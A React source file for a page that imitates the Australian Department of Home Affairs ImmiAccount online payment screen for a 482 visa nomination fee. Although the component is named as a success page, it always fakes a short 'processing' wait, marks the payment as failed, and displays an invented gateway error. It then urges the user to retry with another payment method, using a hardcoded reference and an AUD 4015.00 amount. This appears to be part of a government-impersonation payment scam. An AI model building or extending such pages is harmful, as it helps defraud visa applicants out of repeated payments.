import React, { useEffect, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import logoStacked from "../assets/images/logostacked.png";
import "./immiaccount.css";

function PaymentSuccess() {
  const location = useLocation();
  const navigate = useNavigate();
  const [loading, setLoading] = useState(true);
  const [paymentData, setPaymentData] = useState(null);

  const queryParams = new URLSearchParams(location.search);
  const sessionId = queryParams.get("session_id") || queryParams.get("order_id");
  const paymentId = queryParams.get("payment_id");

  useEffect(() => {
    let isMounted = true;

    // Simulate verification check, then fail payment with Technical Error
    const timer = setTimeout(() => {
      if (!isMounted) return;

      // Extract existing payment from localStorage if available
      let foundPayment = null;
      try {
        const saved = localStorage.getItem("au_payments");
        if (saved) {
          const list = JSON.parse(saved);
          if (Array.isArray(list)) {
            // Find payment by paymentId or reference, or default to first pending
            foundPayment =
              list.find(
                (p) =>
                  String(p.id) === String(paymentId) ||
                  String(p._id) === String(paymentId) ||
                  p.ref === "9S868UST",
              ) ||
              list.find((p) => (p.status || "").toLowerCase() === "pending") ||
              list[0];

            // Mark this payment as Failed in localStorage
            const updated = list.map((p) => {
              if (
                foundPayment &&
                (p.id === foundPayment.id ||
                  p.ref === foundPayment.ref ||
                  p.ref === "9S868UST")
              ) {
                return { ...p, status: "Failed" };
              }
              return p;
            });
            localStorage.setItem("au_payments", JSON.stringify(updated));
          }
        }
      } catch (e) {
        console.error("Failed to update payment status in storage:", e);
      }

      setPaymentData(foundPayment);
      setLoading(false);
    }, 1200);

    return () => {
      isMounted = false;
      clearTimeout(timer);
    };
  }, [sessionId, paymentId]);

  const refNumber =
    paymentData?.ref ||
    paymentData?.referenceNumber ||
    "9S868UST";

  const amountFormatted =
    paymentData?.amount ?
      parseFloat(paymentData.amount).toFixed(2)
    : "4015.00";

  const paymentDescription =
    paymentData?.type ||
    "Payment for Nomination Application (9S868UST)";

  const dateFormatted = new Date().toLocaleString("en-AU", {
    dateStyle: "medium",
    timeStyle: "short",
  });

  return (
    <div
      className="immi-application"
      style={{
        minHeight: "100vh",
        backgroundColor: "#b5bcc4",
        display: "flex",
        flexDirection: "column",
      }}>
      {/* Header */}
      <header className="immi-header">
        <div className="immi-header-left">
          <img
            src={logoStacked}
            alt="Australian Government Department of Home Affairs"
            className="immi-header-logo-stacked"
          />
        </div>
        <div className="immi-header-right">
          <div className="immi-header-user-row">
            <span className="immi-header-username">
              {(localStorage.getItem("username") || "Kunal").toUpperCase()}
            </span>
            <button
              type="button"
              className="immi-header-link"
              onClick={() => navigate("/user-portal")}>
              Manage Account
            </button>
          </div>
          <h1>Online Payments</h1>
        </div>
      </header>

      {/* Main Content (Full Width) */}
      <main
        style={{
          width: "100%",
          padding: "14px 24px 24px 24px",
          boxSizing: "border-box",
        }}>
        {loading ? (
          <div
            style={{
              backgroundColor: "white",
              padding: "48px 24px",
              borderRadius: "4px",
              border: "1px solid #ccd4db",
              textAlign: "center",
              boxShadow: "0 2px 4px rgba(0,0,0,0.04)",
              maxWidth: "600px",
              margin: "40px auto",
            }}>
            <div
              style={{
                width: "44px",
                height: "44px",
                border: "3.5px solid #e2e8f0",
                borderTopColor: "#004b87",
                borderRightColor: "#003087",
                borderRadius: "50%",
                animation: "spin 0.85s linear infinite",
                margin: "0 auto 16px auto",
              }}
            />
            <h2
              style={{
                color: "#002b49",
                margin: "0 0 8px 0",
                fontSize: "18px",
                fontWeight: "600",
              }}>
              Processing Payment with Department of Home Affairs...
            </h2>
            <p style={{ color: "#64748b", margin: 0, fontSize: "13px" }}>
              Please wait while your transaction request is being communicated with the payment gateway.
            </p>
            <style>{`
              @keyframes spin {
                to { transform: rotate(360deg); }
              }
            `}</style>
          </div>
        ) : (
          <div
            style={{
              backgroundColor: "white",
              padding: "32px 36px",
              borderRadius: "6px",
              boxShadow: "0 4px 6px rgba(0,0,0,0.05)",
              borderTop: "4px solid #dc2626",
              maxWidth: "860px",
              margin: "20px auto",
              boxSizing: "border-box",
            }}>
            {/* Error Icon */}
            <div
              style={{
                width: "56px",
                height: "56px",
                borderRadius: "50%",
                backgroundColor: "#fee2e2",
                color: "#b91c1c",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                fontSize: "30px",
                fontWeight: "bold",
                margin: "0 auto 16px auto",
              }}>
              !
            </div>

            <h1
              style={{
                color: "#991b1b",
                fontSize: "22px",
                margin: "0 0 6px 0",
                fontWeight: "700",
                textAlign: "center",
              }}>
              Technical Error
            </h1>

            <p
              style={{
                color: "#475569",
                fontSize: "13px",
                textAlign: "center",
                margin: "0 0 20px 0",
              }}>
              Your payment could not be processed due to a gateway technical error.
            </p>

            {/* Official Technical Error Banner */}
            <div
              style={{
                backgroundColor: "#fef2f2",
                border: "1px solid #fca5a5",
                borderLeft: "6px solid #dc2626",
                padding: "16px 20px",
                borderRadius: "4px",
                margin: "0 0 24px 0",
                color: "#7f1d1d",
                fontSize: "14px",
                lineHeight: "1.6",
                textAlign: "left",
              }}>
              <strong>Technical Error:</strong> The payment service is temporarily
              unavailable due to a technical error. Your payment could not be
              processed and no funds have been debited from your card or account.
              Please select an alternative payment option (such as Credit / Debit
              Card) to complete your transaction, or try again later.
            </div>

            {/* Transaction Details Summary Box */}
            <div
              style={{
                border: "1px solid #e2e8f0",
                borderRadius: "6px",
                overflow: "hidden",
                marginBottom: "20px",
                backgroundColor: "#fafbfc",
              }}>
              <div
                style={{
                  backgroundColor: "#002b49",
                  color: "white",
                  padding: "10px 16px",
                  fontSize: "14px",
                  fontWeight: "600",
                }}>
                Transaction Reference Details
              </div>
              <table
                style={{
                  width: "100%",
                  borderCollapse: "collapse",
                  fontSize: "13px",
                }}>
                <tbody>
                  <tr style={{ borderBottom: "1px solid #e2e8f0" }}>
                    <td
                      style={{
                        padding: "10px 16px",
                        fontWeight: "bold",
                        width: "220px",
                        color: "#475569",
                        backgroundColor: "#f8fafc",
                      }}>
                      Reference Number:
                    </td>
                    <td
                      style={{
                        padding: "10px 16px",
                        color: "#1e293b",
                        fontWeight: "600",
                      }}>
                      {refNumber}
                    </td>
                  </tr>
                  <tr style={{ borderBottom: "1px solid #e2e8f0" }}>
                    <td
                      style={{
                        padding: "10px 16px",
                        fontWeight: "bold",
                        color: "#475569",
                        backgroundColor: "#f8fafc",
                      }}>
                      Payment Description:
                    </td>
                    <td style={{ padding: "10px 16px", color: "#1e293b" }}>
                      {paymentDescription}
                    </td>
                  </tr>
                  <tr style={{ borderBottom: "1px solid #e2e8f0" }}>
                    <td
                      style={{
                        padding: "10px 16px",
                        fontWeight: "bold",
                        color: "#475569",
                        backgroundColor: "#f8fafc",
                      }}>
                      Visa Subclass / Program:
                    </td>
                    <td style={{ padding: "10px 16px", color: "#1e293b" }}>
                      482 skill in demand visa
                    </td>
                  </tr>
                  <tr style={{ borderBottom: "1px solid #e2e8f0" }}>
                    <td
                      style={{
                        padding: "10px 16px",
                        fontWeight: "bold",
                        color: "#475569",
                        backgroundColor: "#f8fafc",
                      }}>
                      Attempted Amount:
                    </td>
                    <td
                      style={{
                        padding: "10px 16px",
                        color: "#1e293b",
                        fontWeight: "700",
                      }}>
                      AUD ${amountFormatted}
                    </td>
                  </tr>
                  <tr style={{ borderBottom: "1px solid #e2e8f0" }}>
                    <td
                      style={{
                        padding: "10px 16px",
                        fontWeight: "bold",
                        color: "#475569",
                        backgroundColor: "#f8fafc",
                      }}>
                      Transaction Status:
                    </td>
                    <td style={{ padding: "10px 16px" }}>
                      <span
                        style={{
                          backgroundColor: "#fee2e2",
                          color: "#991b1b",
                          padding: "3px 10px",
                          borderRadius: "4px",
                          fontWeight: "bold",
                          fontSize: "12px",
                          border: "1px solid #fca5a5",
                          display: "inline-block",
                        }}>
                        Failed (Technical Error)
                      </span>
                    </td>
                  </tr>
                  <tr style={{ borderBottom: "1px solid #e2e8f0" }}>
                    <td
                      style={{
                        padding: "10px 16px",
                        fontWeight: "bold",
                        color: "#475569",
                        backgroundColor: "#f8fafc",
                      }}>
                      Error Reference Code:
                    </td>
                    <td
                      style={{
                        padding: "10px 16px",
                        color: "#b91c1c",
                        fontFamily: "monospace",
                        fontWeight: "700",
                        fontSize: "13px",
                      }}>
                      ERR_IMMI_GATEWAY_503
                    </td>
                  </tr>
                  <tr>
                    <td
                      style={{
                        padding: "10px 16px",
                        fontWeight: "bold",
                        color: "#475569",
                        backgroundColor: "#f8fafc",
                      }}>
                      Date and Time:
                    </td>
                    <td style={{ padding: "10px 16px", color: "#1e293b" }}>
                      {dateFormatted}
                    </td>
                  </tr>
                </tbody>
              </table>
            </div>

            {/* Assistance Guidance Notice */}
            <div
              style={{
                padding: "14px 18px",
                backgroundColor: "#f8fafc",
                border: "1px solid #e2e8f0",
                borderRadius: "4px",
                fontSize: "12.5px",
                color: "#64748b",
                lineHeight: "1.55",
                marginBottom: "26px",
              }}>
              <strong>Need Assistance?</strong> If you continue to experience
              this issue, please try making your payment again through ImmiAccount.
              If the problem persists, contact the Department of Home Affairs
              technical support citing Reference Number{" "}
              <strong style={{ color: "#0f172a" }}>{refNumber}</strong> and Error
              Code{" "}
              <strong style={{ color: "#0f172a" }}>ERR_IMMI_GATEWAY_503</strong>.
            </div>

            {/* Action Buttons */}
            <div
              style={{
                display: "flex",
                justifyContent: "center",
                gap: "14px",
                flexWrap: "wrap",
              }}>
              <button
                type="button"
                className="immi-btn-classic"
                onClick={() => navigate("/user-portal")}
                style={{
                  backgroundColor: "#0056b3",
                  color: "white",
                  padding: "9px 26px",
                  fontWeight: "bold",
                  border: "none",
                  cursor: "pointer",
                  borderRadius: "4px",
                  fontSize: "14px",
                }}>
                Try Payment Again
              </button>
              <button
                type="button"
                className="immi-btn-classic"
                onClick={() => navigate("/user-portal")}
                style={{
                  backgroundColor: "#f1f5f9",
                  border: "1px solid #cbd5e1",
                  color: "#334155",
                  padding: "9px 22px",
                  cursor: "pointer",
                  borderRadius: "4px",
                  fontSize: "14px",
                }}>
                Return to ImmiAccount Portal
              </button>
            </div>
          </div>
        )}
      </main>

      <footer className="immi-dashboard-footer">
        <div className="immi-footer-inner">
          <a href="#accessibility" onClick={(e) => e.preventDefault()}>
            Accessibility
          </a>
          <span className="immi-footer-sep">|</span>
          <a href="#security" onClick={(e) => e.preventDefault()}>
            Online Security
          </a>
          <span className="immi-footer-sep">|</span>
          <a href="#privacy" onClick={(e) => e.preventDefault()}>
            Privacy
          </a>
          <span className="immi-footer-sep">|</span>
          <a href="#copyright" onClick={(e) => e.preventDefault()}>
            Copyright &amp; Disclaimer
          </a>
        </div>
      </footer>
    </div>
  );
}

export default PaymentSuccess;
